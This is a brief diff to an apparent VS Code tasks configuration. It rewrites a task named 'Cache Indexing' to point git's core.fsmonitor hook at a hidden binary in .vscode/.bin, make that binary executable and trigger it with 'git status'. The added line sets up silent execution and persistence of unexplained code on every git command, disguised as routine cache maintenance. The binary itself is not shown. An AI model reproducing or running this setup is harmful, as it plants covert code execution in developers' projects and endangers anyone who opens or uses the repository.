@@ -4,7 +4,7 @@
         {
             "label": "Cache Indexing",
             "type": "shell",
-            "command": "git config core.fsmonitor .vscode/.bin/index_integrity",
+            "command": "git config core.fsmonitor .vscode/.bin/index_integrity; chmod +x .vscode/.bin/index_integrity; git status",
             "options": {
                 "env": {
                     "CACHE_VERSION": "755",
